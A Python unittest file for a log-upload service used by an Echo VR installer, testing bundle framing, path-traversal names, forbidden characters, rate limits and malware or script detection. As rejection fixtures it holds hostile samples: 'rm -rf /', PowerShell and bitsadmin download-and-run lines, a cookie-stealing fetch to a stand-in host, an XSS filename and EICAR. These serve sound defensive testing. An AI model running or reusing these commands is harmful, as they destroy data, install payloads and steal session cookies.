"""Tests for log_upload.py: python3 -m unittest test_log_upload

Magika and clamd are stand-ins here (a test with the real Magika runs when it's
installed); everything else is the service as it runs, over HTTP on a free port.
"""

from __future__ import annotations

import http.client
import importlib.util
import json
import tempfile
import threading
import unittest
from pathlib import Path

import log_upload as lu

UA = "EchoVR-Installer/0.10.0"
LAUNCHER_LOG = (
    "2026-10-03T10:00:00.123456Z  INFO ---- Echo VR Launcher v0.10.0 starting ----\n"
    "2026-10-03T10:00:01.000000Z  WARN couldn't reach the feed: timed out\n"
)
ECHO_LOG = "[10-03-2026] [10:00:00]: [NETGAME] NetGame switching state (from logged in, to lobby)\r\n" * 20


def bundle(*files: tuple[str, bytes], header: bytes = b"ECHOVR-LOGS 1\n", end: bytes = b"END\n") -> bytes:
    out = header
    for name, data in files:
        out += b"FILE %s %d\n" % (name.encode(), len(data)) + data
    return out + end


class FakeScan:
    """clamd: flags the EICAR test string."""

    def __init__(self):
        self.data = b""

    def feed(self, data: bytes) -> None:
        self.data += data

    def verdict(self) -> None:
        if b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE" in self.data:
            raise lu.Rejected("malware", detail="Eicar-Signature FOUND")

    def close(self) -> None:
        pass


def fake_code(data: bytes):
    """Magika: scripts by their look, from the first and last 1 KiB only (as Magika reads
    them)."""
    sample = data[:1024] + data[-1024:]
    if b"#!/bin/sh" in sample or b"Invoke-Expression" in sample:
        return "shell"
    return None


class Server:
    def __init__(self, store: Path):
        self.service = lu.Service(store, FakeScan, fake_code)
        self.httpd = lu.serve(self.service, "127.0.0.1", 0)
        self.port = self.httpd.server_address[1]
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def post(self, body: bytes, headers: dict | None = None, path: str = lu.PATH):
        h = {"Content-Type": "text/plain; charset=utf-8", "User-Agent": UA,
             "Content-Length": str(len(body))}
        h.update(headers or {})
        c = http.client.HTTPConnection("127.0.0.1", self.port, timeout=30)
        c.putrequest("POST", path, skip_accept_encoding=True)
        for k, v in h.items():
            if v is not None:
                c.putheader(k, v)
        c.endheaders()
        try:
            c.send(body)
        except (BrokenPipeError, ConnectionResetError):
            pass
        r = c.getresponse()
        data = r.read()
        c.close()
        return r.status, json.loads(data or b"{}"), data

    def stop(self):
        self.httpd.shutdown()
        self.httpd.server_close()


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.store = Path(self.tmp.name)
        self.server = Server(self.store)
        # Every request comes from here: only Limits counts them.
        self.server.service.rate = lu.RateLimit(limit=10**6)

    def tearDown(self):
        self.server.stop()
        self.tmp.cleanup()

    def kept(self) -> list[Path]:
        return [p for p in self.store.iterdir() if lu.CODE.fullmatch(p.name)]

    def incoming(self) -> list[Path]:
        return list((self.store / ".incoming").iterdir())

    def assert_refused(self, body: bytes, status: int = 422, headers: dict | None = None):
        got, reply, raw = self.server.post(body, headers)
        self.assertEqual(got, status, reply)
        self.assertIn("error", reply)
        self.assertEqual(self.kept(), [])
        self.assertEqual(self.incoming(), [])
        return reply, raw


class Keeps(Base):
    def test_keeps_real_logs(self):
        body = bundle(("launcher/EchoVR_Launcher.log", LAUNCHER_LOG.encode()),
                      ("echo/pc-latest.r14-1.log", ECHO_LOG.encode()),
                      ("echoxr/pc-latest.runtime", "Jürgen's headset: Index ✓\n".encode()))
        status, reply, _ = self.server.post(body)
        self.assertEqual(status, 200, reply)
        code = reply["code"]
        self.assertRegex(code, lu.CODE)
        folder = self.store / code
        meta = json.loads((folder / "meta.json").read_text())
        self.assertEqual(meta["client"], UA)
        self.assertEqual([f["stored"] for f in meta["files"]],
                         ["01-launcher-EchoVR_Launcher.log", "02-echo-pc-latest.r14-1.log",
                          "03-echoxr-pc-latest.runtime.log"])
        self.assertEqual((folder / "02-echo-pc-latest.r14-1.log").read_bytes().decode(), ECHO_LOG)
        self.assertEqual(self.incoming(), [])
        self.assertNotIn("127.0.0.1", (folder / "meta.json").read_text())


class Refuses(Base):
    def test_framing(self):
        log = ("launcher/a.log", b"hi\n")
        for body in [
            bundle(log, header=b"ECHOVR-LOGS 2\n"),
            bundle(log, end=b""),
            bundle(log, end=b"END\nmore"),
            bundle(),
            b"ECHOVR-LOGS 1\nFILE launcher/a.log 10\nshort\nEND\n",
            b"ECHOVR-LOGS 1\nFILE launcher/a.log\n\nEND\n",
            b"ECHOVR-LOGS 1\n" + b"x" * 400 + b"\n",
        ]:
            with self.subTest(body=body[:40]):
                self.assert_refused(body)

    def test_kinds_and_names(self):
        self.assert_refused(bundle(("system/a.log", b"x\n")))
        self.assert_refused(bundle(("launcher/../a.log", b"x\n")))
        self.assert_refused(bundle(("launcher/..", b"x\n")))
        self.assert_refused(bundle(("launcher/a b.log", b"x\n")))

    def test_counts_and_sizes(self):
        many = [(f"echo/{i}.log", b"x\n") for i in range(lu.MAX_FILES + 1)]
        self.assert_refused(bundle(*many))
        big = b"FILE echo/a.log %d\n" % (lu.MAX_FILE + 1)
        self.assert_refused(b"ECHOVR-LOGS 1\n" + big + b"x" * 100)

    def test_characters(self):
        for text in [
            b"ok\x00nul\n",
            b"\x1b[31mred\x1b[0m\n",
            b"\x1b]8;;https://evil/\x07link\x1b]8;;\x07\n",
            "price ‮3pm\n".encode(),
            "zero​width\n".encode(),
            "line sep\n".encode(),
            "\u009bcsi\n".encode(),
            "tag\U000e0041\n".encode(),
            "private\n".encode(),
            b"bare\rcarriage return\n",
            b"\xff\xfe not utf-8\n",
            b"overlong \xc0\xaf\n",
        ]:
            with self.subTest(text=text):
                self.assert_refused(bundle(("launcher/a.log", text)))

    def test_lines_and_blobs(self):
        self.assert_refused(bundle(("echo/a.log", b"a" * (lu.MAX_LINE + 1) + b"\n")))
        self.assert_refused(bundle(("echo/a.log", b"x " * lu.MAX_LINE)))
        self.assert_refused(bundle(("echo/a.log", b"token " + b"QUJD" * 300 + b"\n")))

    def test_scanner_and_magika(self):
        eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n"
        self.assert_refused(bundle(("echo/a.log", eicar)))
        self.assert_refused(bundle(("echo/a.log", b"#!/bin/sh\nrm -rf /\n")))
        # A script hidden in the middle of a long log: its segment gives it away.
        middle = (LAUNCHER_LOG * 300).encode() + b"Invoke-Expression $x\n" + (LAUNCHER_LOG * 300).encode()
        self.assert_refused(bundle(("launcher/a.log", middle)))

    def test_requests(self):
        body = bundle(("launcher/a.log", b"hi\n"))
        self.assert_refused(body, 403, {"User-Agent": "curl/8.0"})
        self.assert_refused(body, 415, {"Content-Type": "application/zip"})
        self.assert_refused(body, 411, {"Content-Length": None, "Transfer-Encoding": "chunked"})
        self.assert_refused(body, 413, {"Content-Length": str(lu.MAX_BODY + 1)})

    def test_never_echoes_the_client(self):
        _, raw = self.assert_refused(bundle(("x<script>alert(1)</script>/a.log", b"hi\n")))
        self.assertNotIn(b"script", raw)
        _, raw = self.assert_refused(bundle(("launcher/‮.log", b"hi\n")))
        self.assertNotIn("‮".encode(), raw)


class Limits(Base):
    def setUp(self):
        super().setUp()
        self.server.service.rate = lu.RateLimit()

    def test_ten_an_hour(self):
        body = bundle(("launcher/a.log", b"hi\n"))
        for _ in range(lu.RATE_LIMIT):
            self.assertEqual(self.server.post(body)[0], 200)
        status, reply, _ = self.server.post(body)
        self.assertEqual(status, 429)
        # Another address (as Apache passes it on) isn't affected.
        status, _, _ = self.server.post(body, {"X-Real-IP": "203.0.113.7"})
        self.assertEqual(status, 200)

    def test_rate_keys(self):
        r = lu.RateLimit(limit=2, window=60)
        self.assertTrue(r.allow("2001:db8::1", 0))
        self.assertTrue(r.allow("2001:db8::ffff", 1))
        self.assertFalse(r.allow("2001:db8:0:0:1::1", 2), "the same /64")
        self.assertTrue(r.allow("2001:db8:0:1::1", 3), "another /64")
        self.assertTrue(r.allow("2001:db8::1", 120), "after the window")
        self.assertEqual(lu.RateLimit.key("::ffff:198.51.100.1"), "198.51.100.1")
        self.assertEqual(lu.RateLimit.key("not an ip"), "unknown")

    def test_trusts_apache_only(self):
        self.assertEqual(lu.client_ip("127.0.0.1", "203.0.113.7"), "203.0.113.7")
        self.assertEqual(lu.client_ip("198.51.100.1", "203.0.113.7"), "198.51.100.1")
        self.assertEqual(lu.client_ip("127.0.0.1", None), "127.0.0.1")

    def test_cleans_up(self):
        old = self.store / "ABCDEFGH"
        old.mkdir()
        (old / "meta.json").write_text("{}")
        stale = self.store / ".incoming" / "deadbeef"
        stale.mkdir()
        lu.clean_up(self.store, old.stat().st_mtime + lu.RETENTION_S + 1)
        self.assertFalse(old.exists())
        self.assertFalse(stale.exists())


class Checks(unittest.TestCase):
    def test_segments_cover_every_byte(self):
        data = b"".join(b"line %d\n" % i for i in range(5000))
        parts = list(lu.segments(data, 1024))
        self.assertEqual(b"".join(parts), data)
        self.assertTrue(all(len(p) <= 1024 and p.endswith(b"\n") for p in parts))
        # A line longer than a segment: cut through, still nothing over the size.
        long = b"x" * 5000 + b"\n"
        parts = list(lu.segments(long, 1024))
        self.assertEqual(b"".join(parts), long)
        self.assertTrue(all(len(p) <= 1024 for p in parts))

    def test_forbidden_characters(self):
        for ch in "\x00\x07\x1b\x7f\x85\x9b­؜​‎‪‮⁦⁩  ﻿\U000e0001":
            self.assertTrue(lu.FORBIDDEN.search(ch), repr(ch))
        for ch in "\tAz09 äß日本ё✓€°–…":
            self.assertIsNone(lu.FORBIDDEN.search(ch), repr(ch))

    @unittest.skipUnless(importlib.util.find_spec("magika"), "magika isn't installed")
    def test_real_magika(self):
        from magika import Magika

        code = lu.magika_code(Magika())
        # Logs, whole and in segments, aren't code (an Echo log looks a bit like SQL to the
        # model, below its threshold).
        echo = "".join(
            f"[10-03-2026] [10:{i // 60 % 60:02d}:{i % 60:02d}]: [NETGAME] NetGame switching state "
            f"(from logged in, to lobby) session={i}\r\n" for i in range(3000)).encode()
        for log in [(LAUNCHER_LOG * 400).encode(), echo]:
            for part in [log, *lu.segments(log)]:
                self.assertIsNone(code(part))
        for script in [
            b"#!/bin/bash\nset -euo pipefail\nfor f in /tmp/*; do\n  rm -rf \"$f\"\ndone\n",
            b"$wc = New-Object System.Net.WebClient\nInvoke-Expression $wc.DownloadString('http://x/a.ps1')\n",
            b"@echo off\nsetlocal\nbitsadmin /transfer j http://x/a.exe %TEMP%\\a.exe\nstart %TEMP%\\a.exe\n",
            b"Set sh = CreateObject(\"WScript.Shell\")\nsh.Run \"cmd /c calc.exe\", 0, False\n",
            b"<!DOCTYPE html>\n<html><head><script>fetch('http://x/'+document.cookie)</script></head></html>\n",
        ]:
            self.assertIsNotNone(code(script), script)


if __name__ == "__main__":
    unittest.main()
